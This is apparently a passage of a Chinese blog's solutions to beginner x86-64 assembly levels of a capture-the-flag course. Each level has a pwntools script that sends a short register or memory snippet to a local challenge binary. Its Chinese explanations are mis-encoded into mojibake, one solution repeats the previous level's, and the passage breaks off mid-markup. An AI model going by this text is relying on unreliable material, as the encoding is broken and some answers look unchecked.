class="hljs-type">0</span><br><br>åœ¨ä¸ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤çš„æƒ…å†µä¸‹ï¼š  <br>mov, xchg<br><br>è¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>rax = rdi AND rsi<br><br>å³å°† rax è®¾ç½®ä¸º (rdi AND rsi) çš„å€¼ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>rdi = <span class="hljs-number">0x953236d544892262</span>  <br>rsi = <span class="hljs-number">0x57539fb8540f1b4b</span><br></code></pre></td></tr></table></figure><ul><li>rdiå’Œrsiå¼‚æˆ–ä¹‹åå€¼è¢«å­˜åœ¨rdiä¸­</li><li>raxä½¿ç”¨xoræ¸…é›¶</li><li>rdiå’Œraxä½¿ç”¨æˆ–è¿ç®—ï¼Œä»è€Œå°†raxè¢«èµ‹å€¼ä¸ºrdiçš„å€¼</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    and rdi,rsi</span><br><span class="hljs-string">    or rax, rdi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œä½ å°†ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚ä½ å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>åœ¨æ¯æ¬¡è¿è¡Œä¹‹å‰ï¼Œæˆ‘ä»¬å°†åŠ¨æ€åœ°åœ¨å†…å­˜ä¸­è®¾ç½®ä¸€äº›å€¼ã€‚æ¯æ¬¡è¿è¡Œæ—¶ï¼Œè¿™äº›å€¼éƒ½ä¼šæ”¹å˜ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œä¸€äº›å…¬å¼åŒ–çš„æ“ä½œã€‚æˆ‘ä»¬ä¼šäº‹å…ˆå‘Šè¯‰ä½ å“ªäº›å¯„å­˜å™¨è¢«è®¾ç½®äº†ï¼Œä»¥åŠä½ åº”è¯¥æŠŠç»“æœæ”¾åœ¨å“ªé‡Œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç»“æœåº”è¯¥å­˜å‚¨åœ¨<span class="hljs-built_in">rax</span>å¯„å­˜å™¨ä¸­ã€‚<br><br>åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œä½ å°†ä½¿ç”¨ä½é€»è¾‘å’Œæ“ä½œã€‚è¿™å°†æ¶‰åŠä¸å­˜å‚¨åœ¨å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­çš„ä½ç›´æ¥äº¤äº’çš„å¤§é‡æ“ä½œã€‚ä½ è¿˜å¯èƒ½éœ€è¦ä½¿ç”¨x86çš„é€»è¾‘æŒ‡ä»¤ï¼š<span class="hljs-keyword">and</span>ã€<span class="hljs-keyword">or</span>ã€<span class="hljs-keyword">not</span>ã€<span class="hljs-keyword">xor</span>ã€‚<br><br>åªèƒ½ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š<br><span class="hljs-keyword">and</span>ã€<span class="hljs-keyword">or</span>ã€<span class="hljs-keyword">xor</span><br><br>å®ç°ä»¥ä¸‹é€»è¾‘ï¼š<br>å¦‚æœxæ˜¯å¶æ•°ï¼Œåˆ™yç­‰äº<span class="hljs-number">1</span>ï¼›å¦åˆ™ï¼Œyç­‰äº<span class="hljs-number">0</span>ã€‚<br><br>å…¶ä¸­ï¼š<br>x = <span class="hljs-built_in">rdi</span><br>y = <span class="hljs-built_in">rax</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è®¾ç½®å‚æ•°ï¼Œä»¥ä¾¿ä½ ç¼–å†™ä»£ç ï¼š<br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x3a0610d0</span><br></code></pre></td></tr></table></figure><ul><li>rdiä¸1ä¸è¿ç®—å¯ä»¥åˆ¤æ–­rdiçš„å¥‡å¶<ul><li>ä¸º1ï¼šå¥‡æ•°</li><li>ä¸º0ï¼šå¶æ•°</li></ul></li><li>æŠŠåˆšåˆšå¾—åˆ°çš„rdiçš„æœ€åä¸€ä½èµ‹å€¼ç»™rax</li><li>raxä¸1å¼‚æˆ–å³å¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    and rdi,1</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    or rax,rdi</span><br><span class="hljs-string">    xor rax,1</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="12"><a href="#12" class="headerlink" title="12"></a>12</h1><p>åœ°å€ä¸­æ•°æ®ä¼ è¾“åˆ°å¯„å­˜å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="13"><a href="#13" class="headerlink" title="13"></a>13</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>æ— æ³•å¯¹å†…å­˜ç›´æ¥è¿›è¡Œè¿ç®—æ“ä½œï¼Œéœ€è¦å¯„å­˜å™¨è¿›è¡Œä¸­è½¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax,[0x404000]</span><br><span class="hljs-string">    mov rdi,[0x404000]</span><br><span class="hljs-string">    mov rdi,0x1337</span><br><span class="hljs-string">    add [0x404000],rdi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="15"><a href="#15" class="headerlink" title="15"></a>15</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">å›æƒ³ä¸€ä¸‹ï¼Œåœ¨x86_64ä¸­ï¼Œå¯„å­˜å™¨çš„å®½åº¦ä¸º<span class="hljs-number">64</span>ä½ï¼Œæ„å‘³ç€å®ƒä»¬å¯ä»¥å­˜å‚¨<span class="hljs-number">64</span>ä½ã€‚<br><br>åŒæ ·ï¼Œæ¯ä¸ªå†…å­˜ä½ç½®å¯ä»¥è¢«è§†ä¸ºä¸€ä¸ª<span class="hljs-number">64</span>ä½çš„å€¼ã€‚<br><br>æˆ‘ä»¬å°†<span class="hljs-number">64</span>ä½ï¼ˆ<span class="hljs-number">8</span>å­—èŠ‚ï¼‰çš„å†…å®¹ç§°ä¸º<span class="hljs-string">&quot;quad word&quot;</span>ã€‚<br><br>ä¸‹é¢æ˜¯å†…å­˜å¤§å°çš„åç§°åŠå…¶å¯¹åº”çš„å­—èŠ‚æ•°ï¼š  <br>Quad <span class="hljs-built_in">Word</span> = <span class="hljs-number">8</span>å­—èŠ‚ = <span class="hljs-number">64</span>ä½  <br>Double <span class="hljs-built_in">Word</span> = <span class="hljs-number">4</span>å­—èŠ‚ = <span class="hljs-number">32</span>ä½  <br><span class="hljs-built_in">Word</span> = <span class="hljs-number">2</span>å­—èŠ‚ = <span class="hljs-number">16</span>ä½  <br><span class="hljs-built_in">Byte</span> = <span class="hljs-number">1</span>å­—èŠ‚ = <span class="hljs-number">8</span>ä½<br><br>åœ¨x86_64ä¸­ï¼Œå½“è§£å¼•ç”¨ä¸€ä¸ªåœ°å€æ—¶ï¼Œä½ å¯ä»¥è®¿é—®æ¯ä¸ªè¿™äº›å¤§å°ï¼Œå°±åƒä½¿ç”¨æ›´å¤§æˆ–æ›´å°çš„å¯„å­˜å™¨è®¿é—®ä¸€æ ·ï¼š  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address] &lt;=&gt; å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, [address] &lt;=&gt; å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆå­—ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [address] &lt;=&gt; å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆåŒå­—ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [address] &lt;=&gt; å°†åœ°å€ä¸­çš„å®Œæ•´quad <span class="hljs-built_in">word</span>ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨<br><br>è¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>å°†<span class="hljs-built_in">rax</span>å¯„å­˜å™¨è®¾ç½®ä¸º<span class="hljs-number">0x404000</span>å¤„çš„å­—èŠ‚ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è®¾ç½®å‚æ•°ï¼Œä»¥ä¾¿ä½ ç¼–å†™ä»£ç ï¼š  <br>[<span class="hljs-number">0x404000</span>] = <span class="hljs-number">0x1a4b04</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov al, [0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="16"><a href="#16" class="headerlink" title="16"></a>16</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œä½ å°†ä½¿ç”¨å†…å­˜è¿›è¡Œæ“ä½œã€‚è¿™å°†è¦æ±‚ä½ è¯»å–æˆ–å†™å…¥çº¿æ€§å­˜å‚¨åœ¨å†…å­˜ä¸­çš„æ•°æ®ã€‚å¦‚æœä½ æ„Ÿåˆ°å›°æƒ‘ï¼Œè¯·å»çœ‹ä¸€ä¸‹<span class="hljs-string">&quot;ike&quot;</span>ä¸­çš„çº¿æ€§å¯»å€æ¨¡å—ã€‚ä½ å¯èƒ½è¿˜ä¼šè¢«è¦æ±‚å¤šæ¬¡è§£å¼•ç”¨ï¼Œä»¥ä½¿ç”¨æˆ‘ä»¬åŠ¨æ€æ”¾ç½®åœ¨å†…å­˜ä¸­çš„æ•°æ®ã€‚<br><br>å›æƒ³ä¸€ä¸‹ï¼Œä»¥ä¸‹æ˜¯å†…å­˜å¤§å°çš„åç§°åŠå…¶å¯¹åº”çš„å­—èŠ‚æ•°ï¼š<br>  Quad <span class="hljs-built_in">Word</span>   = <span class="hljs-number">8</span>å­—èŠ‚ = <span class="hljs-number">64</span>ä½<br>  Double <span class="hljs-built_in">Word</span> = <span class="hljs-number">4</span>å­—èŠ‚ = <span class="hljs-number">32</span>ä½<br>  <span class="hljs-built_in">Word</span>        = <span class="hljs-number">2</span>å­—èŠ‚ = <span class="hljs-number">16</span>ä½<br>  <span class="hljs-built_in">Byte</span>        = <span class="hljs-number">1</span>å­—èŠ‚ = <span class="hljs-number">8</span>ä½<br><br>åœ¨x86_64ä¸­ï¼Œå½“è§£å¼•ç”¨ä¸€ä¸ªåœ°å€æ—¶ï¼Œä½ å¯ä»¥è®¿é—®æ¯ä¸ªè¿™äº›å¤§å°ï¼Œå°±åƒä½¿ç”¨æ›´å¤§æˆ–æ›´å°çš„å¯„å­˜å™¨è®¿é—®ä¸€æ ·ï¼š<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address]        &lt;=&gt;        å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>, [address]        &lt;=&gt;        å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆå­—ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [address]       &lt;=&gt;        å°†åœ°å€ä¸­çš„æœ€ä½æœ‰æ•ˆåŒå­—ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [address]       &lt;=&gt;        å°†åœ°å€ä¸­çš„å®Œæ•´quad <span class="hljs-built_in">word</span>ç§»åŠ¨åˆ°<span class="hljs-built_in">rax</span>å¯„å­˜å™¨<br><br>è¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br>- å°†<span class="hljs-built_in">rax</span>å¯„å­˜å™¨è®¾ç½®ä¸º<span class="hljs-number">0x404000</span>å¤„çš„å­—èŠ‚ã€‚<br>- å°†<span class="hljs-built_in">rbx</span>å¯„å­˜å™¨è®¾ç½®ä¸º<span class="hljs-number">0x404000</span>å¤„çš„å­—ã€‚<br>- å°†<span class="hljs-built_in">rcx</span>å¯„å­˜å™¨è®¾ç½®ä¸º<span class="hljs-number">0x404000</span>å¤„çš„åŒå­—ã€‚<br>- å°†<span class="hljs-built_in">rdx</span>å¯„å­˜å™¨è®¾ç½®ä¸º<span class="hljs-number">0x404000</span>å¤„çš„quad <span class="hljs-built_in">word</span>ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è®¾ç½®å‚æ•°ï¼Œä»¥ä¾¿ä½ ç¼–å†™ä»£ç ï¼š<br>[<span class="hljs-number">0x404000</span>] = <span class="hljs-number">0x845bcb141d380894</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov al,[0x404000]</span><br><span class="hljs-string">   mov bx,[0x404000]</span><br><span class="hljs-string">   mov ecx,[0x404000]</span><br><span class="hljs-string">   mov rdx,[0x404000]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="17"><a href="#17" class="headerlink" title="17"></a>17</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ­£å¦‚ä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°çš„ï¼Œå€¼ä»¥ä¸æˆ‘ä»¬è¡¨ç¤ºçš„é¡ºåºç›¸åçš„æ–¹å¼å­˜å‚¨ã€‚<br><br>ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ï¼š  <br>[<span class="hljs-number">0x1330</span>] = <span class="hljs-number">0x00000000deadc0de</span><br><br>å¦‚æœä½ æ£€æŸ¥å®ƒåœ¨å†…å­˜ä¸­çš„å®é™…è¡¨ç¤ºï¼Œä½ ä¼šçœ‹åˆ°ï¼š  <br>[<span class="hljs-number">0x1330</span>] = <span class="hljs-number">0xde</span>  <br>[<span class="hljs-number">0x1331</span>] = <span class="hljs-number">0xc0</span>  <br>[<span class="hljs-number">0x1332</span>] = <span class="hljs-number">0xad</span>  <br>[<span class="hljs-number">0x1333</span>] = <span class="hljs-number">0xde</span>  <br>[<span class="hljs-number">0x1334</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1335</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1336</span>] = <span class="hljs-number">0x00</span>  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00</span><br><br>åœ¨x86ä¸­ï¼Œä»¥è¿™ç§<span class="hljs-string">&quot;åå‘&quot;</span>å­˜å‚¨çš„æ ¼å¼å­˜å‚¨æ•°æ®æ˜¯æœ‰æ„ä¹‰çš„ï¼Œè¿™è¢«ç§°ä¸º<span class="hljs-string">&quot;Little Endian&quot;</span>ã€‚<br><br>åœ¨è¿™ä¸ªæŒ‘æˆ˜ä¸­ï¼Œæˆ‘ä»¬ä¼šåœ¨æ¯æ¬¡è¿è¡Œæ—¶ç»™ä½ ä¸¤ä¸ªåŠ¨æ€åˆ›å»ºçš„åœ°å€ã€‚<br><br>ç¬¬ä¸€ä¸ªåœ°å€å°†è¢«æ”¾ç½®åœ¨<span class="hljs-built_in">rdi</span>å¯„å­˜å™¨ä¸­ã€‚  <br>ç¬¬äºŒä¸ªåœ°å€å°†è¢«æ”¾ç½®åœ¨<span 